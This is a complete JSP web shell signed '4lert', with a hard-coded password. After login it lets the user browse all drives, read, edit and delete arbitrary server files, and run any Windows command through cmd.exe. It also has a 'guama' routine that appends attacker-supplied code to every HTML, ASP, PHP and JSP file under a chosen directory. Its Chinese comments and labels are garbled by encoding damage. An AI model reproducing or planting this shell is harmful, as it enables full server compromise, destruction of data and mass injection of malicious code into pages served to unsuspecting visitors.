<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="gb2312"%>
<%!
//��������
///////////////////�����޸�/////////////////////////
private String password="2019yjyl";
////////////////////////////////////////////////////
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
	<head>
		<style>
body {
	font-size: 12px;
	font-weight: bold;
}

a {
	color: black;
	text-decoration: underline;
}

a:link a:hover a:visited {
	color: black;
	text-decoration: underline;
}
</style>
		<title>JspX[Code By 4lert]</title>
	</head>
	<body>
		<%!
    public class guamama{
    private java.util.List<java.io.File> fileList = new java.util.ArrayList<java.io.File>();
    	public void addFile(File root, String type)
    	{
        File[] files = root.listFiles(); 
        for(File file: files)
        {
            if(file.isDirectory())
            {
                addFile(file, type);
            }
            else if(file.getName().toLowerCase().endsWith(type.toLowerCase()))
            {
                fileList.add(file);
            }
        }
    	}
    	public void guama(String dir,String url)
    	{
    		File file=new File(dir);
    		File[] files=file.listFiles();
    		String filename=null;
    		addFile(new File(dir), "");
       
       		for(File f: fileList)
       		{
    				filename=f.getName().substring(f.getName().lastIndexOf(".")+1);
 					if(filename.equals("htm"))
 					{
 						new guamama().zhendegua(f.getAbsolutePath().toString(),url);
 					}
 					if(filename.equals("asp"))
 					{
 						new guamama().zhendegua(f.getAbsolutePath(),url);
 					}
 					if(filename.equals("php"))
 					{
 						new guamama().zhendegua(f.getAbsolutePath(),url);
 					}
 					if(filename.equals("html"))
 					{
 						new guamama().zhendegua(f.getAbsolutePath(),url);
 					}
 					if(filename.equals("jsp"))
 					{
 						new guamama().zhendegua(f.getAbsolutePath(),url);
 					}
 					if(filename.equals("aspx"))
 					{
 						new guamama().zhendegua(f.getAbsolutePath(),url);
 					}
    			}
    		}
    	public void zhendegua(String path,String code)
    	{
    		try
			{
			OutputStream pt = new FileOutputStream(path,true);
	    	pt.write(code.getBytes());
	    	pt.flush();
	    	pt.close();
	    	}
	    	catch(Exception e9)
	    	{
	    	
	    	}
	    	}
    }
    %>
		<%
    request.setCharacterEncoding("gb2312");
    response.setCharacterEncoding("gb2312");
    String act="";
    try
    {
    	act=request.getParameter("act").toString();
    }
    catch(Exception e4)
    {
    	act="dir";
    }
    if(request.getSession().getAttribute("4lert")!=null)
    {
    if(request.getSession().getAttribute("4lert").toString().equals("4lert"))
    {
    File root=new File(".");
    File[] roots=root.listRoots();
    out.println("<font color='red'>Code By <a href='http://www.4lert.cn/' target='_blank'>4lert[D.R.T]</a>  �򵥰�</font>");
    out.println("<br />");
    out.println("�������б�");
    out.println("<br />");
    for(int i=0;i<roots.length;i++)
    {
    	out.println("<a href='?act=dir&dir="+roots[i]+"'>"+"["+roots[i]+"]"+"</a>");
    }
    out.println("<a href='?act=gua'>"+"[��������]"+"</a>");
    out.println("<a href='?act=cmd'>"+"[CMD����]"+"</a>");
    out.println("<a href='?act=logout'>"+"[�˳�]"+"</a>");
    out.print("<br />");
    out.print("<br />");
    if(act.equals("dir"))
    {
    try
    {
    String dir=request.getParameter("dir");
    if(dir==null)
    {
    	dir="c:\\";
    }
    else
    {
    	dir=new String(request.getParameter("dir").getBytes("ISO-8859-1"),"gb2312");
    }
    File file=new File(dir);
    File[] files=file.listFiles();
    for(int i=0;i<files.length;i++)
    {
    	if(files[i].isDirectory()==true)
    	{
    		out.println("<a href='?act=dir&dir="+files[i].getAbsolutePath()+"'>"+files[i].getName()+"</a>");
    		out.println("<br />");
    	}
    }
    for(int i=0;i<files.length;i++)
    {
    	if(files[i].isFile()==true)
    	{
    		out.println(files[i].getName()+"<a href='?act=edit&edit="+files[i].getAbsolutePath()+"'>"+"[�༭]"+"</a>"+"--"+"<a href='?act=del&path="+files[i].getAbsolutePath()+"'>"+"[ɾ��]"+"</a>");
    		out.println("<br />");
    	}
    }
    out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    }
    catch(Exception ex)
    {
    out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    }
    }
    if(act.equals("edit"))
    {
    String filepath=new String(request.getParameter("edit").toString().getBytes("ISO-8859-1"),"gb2312");
    BufferedReader reader=new BufferedReader(new FileReader(filepath));
    String content="";
    String a="";
    try
    {
    while((content=reader.readLine())!=null)
    {
    	a+=content;
    }
    reader.close();
        out.println("<form action='?act=update&path="+filepath+"' method='post'>");
    	out.println("<textarea name='txafilecontent' cols='100' rows='10'>"+a+"</textarea>");
    	out.println("<br />");
    	out.println("<input type='submit' name='update' value='�޸��ļ�' />");
    	out.println("</form>");
    	out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    	}
    	catch(Exception e5)
    	{
    	out.println("��ȡ�ļ�ʧ�ܣ�");
    	}
    }
    if(act.equals("update"))
    {
    String filepath=new String(request.getParameter("path").toString().getBytes("ISO-8859-1"),"gb2312");
    String content=request.getParameter("txafilecontent");
    try
    {
    	OutputStream pt = new FileOutputStream(filepath);
    	pt.write(content.getBytes());
    	pt.flush();
    	pt.close();
    	out.println("�޸��ļ��ɹ���");
    	out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    }
    catch(Exception e3)
    {
    	out.println("д���ļ�ʧ�ܣ�");
    	out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    }
    }
    if(act.equals("del"))
    {
    String filepath=new String(request.getParameter("path").toString().getBytes("ISO-8859-1"),"gb2312");
    try
    {
    	boolean isdel= new File(filepath).delete();
    	if(isdel==true)
    	{
    		out.println("ɾ���ļ��ɹ�!");
    		out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    	}
    	else
    	{
    		out.println("ɾ���ļ�ʧ��!");
    		out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    	}
    }
    catch(Exception e7)
    {
    	out.println("ɾ���ļ�ʧ�ܣ�");
    	out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    }
    }
    if(act.equals("gua"))
    {
   	out.println("<form action='?act=guama' method='post'>");
   	out.println("����·����<input type='text' name='txtPath' style='width:500px;' value='c:\' />");
   	out.println("<br />");
   	out.println("�������:<textarea name='txtCode' cols='100' rows='10'></textarea>");
   	out.println("<br />");
   	out.println("<input type='submit' name='update' value='��ʼ����' />");
   	out.println("</form>");
   	out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    }
    if(act.equals("guama"))
    {
    String path=request.getParameter("txtPath");
    String code=request.getParameter("txtCode");
	new guamama().guama(path,code);
	out.println("<font color='red'>����ɹ���</font>");
    out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    }
    if(act.equals("logout"))
    {
    	session.setAttribute("4lert",null);
    	out.println("<script>window.close();</script>");
    }
    if(act.equals("cmd"))
    {
   	out.println("<form action='?act=runcmd' method='post'>");
   	out.println("ִ�����<input type='text' name='txtCmd' style='width:500px;' value='net user' />");
   	out.println("<br />");
   	out.println("<input type='submit' name='update' value='ִ������' />");
   	out.println("</form>");
   	out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    }
    if(act.equals("runcmd"))
    {
    String cmd=request.getParameter("txtCmd");
    StringBuffer strcmd=new StringBuffer();
    String myout="";
    String thisout="";
    if(cmd!=null)
    {
    try{
    Process pro=Runtime.getRuntime().exec("cmd.exe /c"+cmd);
    BufferedReader buf=new BufferedReader(new InputStreamReader(pro.getInputStream()));
    while((myout=buf.readLine())!=null) 
    {
    thisout=strcmd.append(myout+"\r\n").toString();
    }
    out.println("<textarea name='txafilecontent' cols='100' rows='20'>"+thisout+"</textarea>");
    out.println("<br />");
    out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    }
    catch(Exception e6)
    {
    out.println(e6.toString());
    }
    }
    }
    }
    }
    else
    {
    out.println("<form action='?act=login' method='post'>");
   	out.println("<span style='font-size:16px;font-family:����;'>PASSWORD��</span><input type='password' name='txtpass'/>");
   	out.println("<input type='submit' name='update' value='LOGIN' />");
   	out.println("</form>");
    }
    if(act.equals("login"))
    {
    	String pass=request.getParameter("txtpass");
    	if(pass.equals(password))
    	{
    		session.setAttribute("4lert","4lert");
    		String uri=request.getRequestURI();   
  			uri=uri.substring(uri.lastIndexOf("/")+1); 
    		response.sendRedirect(uri);
    	}
    	else
    	{
    		out.println("<font color='red'>��½ʧ�ܣ�</font>");
    		out.println("<a href='javascript:history.go(-1)'>������һҳ</a>");
    	}
    }
    %>
	</body>
</html>
